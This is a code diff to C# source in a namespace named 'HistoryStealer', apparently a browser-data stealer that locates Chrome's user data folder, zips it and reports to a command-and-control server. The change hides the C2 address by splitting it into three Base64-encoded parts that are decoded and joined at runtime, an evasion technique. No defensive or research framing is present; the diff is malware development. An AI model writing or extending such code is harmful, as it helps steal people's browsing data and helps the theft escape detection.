@@ -4,12 +4,32 @@ using System.IO.Compression;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Text; // Add this for Base64 encoding/decoding
 
 namespace HistoryStealer
 {
     public class Config
     {
-        public static readonly string C2Url = "C2_URL_PLACEHOLDER";
+        // Split C2Url into three unequal parts and Base64 encode them
+        private static readonly string C2Part1 = "BASE64_PART1_PLACEHOLDER"; // First part
+        private static readonly string C2Part2 = "BASE64_PART2_PLACEHOLDER"; // Second part
+        private static readonly string C2Part3 = "BASE64_PART3_PLACEHOLDER"; // Third part
+
+        // Property to reconstruct the full URL at runtime
+        public static string C2Url
+        {
+            get
+            {
+                // Decode each part and concatenate
+                byte[] part1Bytes = Convert.FromBase64String(C2Part1);
+                byte[] part2Bytes = Convert.FromBase64String(C2Part2);
+                byte[] part3Bytes = Convert.FromBase64String(C2Part3);
+                return Encoding.UTF8.GetString(part1Bytes) + 
+                       Encoding.UTF8.GetString(part2Bytes) + 
+                       Encoding.UTF8.GetString(part3Bytes);
+            }
+        }
+
         public static readonly string ChromePath = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             @"Google\Chrome\User Data\Default");
@@ -22,6 +42,7 @@ namespace HistoryStealer
         public static readonly bool SelfDestruct = false;
     }
 
+    // Rest of the code remains unchanged
     public class BrowserDataZipper
     {
         public static void CreateZip()
